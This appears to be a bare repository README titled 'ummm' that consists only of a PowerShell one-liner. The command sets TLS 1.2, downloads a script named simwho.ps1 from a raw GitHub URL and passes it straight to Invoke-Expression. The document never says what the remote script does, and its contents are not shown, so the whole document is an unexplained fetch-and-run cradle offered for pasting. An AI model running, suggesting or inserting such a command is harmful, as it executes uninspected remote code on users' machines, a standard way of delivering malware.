# ummm
[System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/william4122/ummm/main/simwho.ps1")
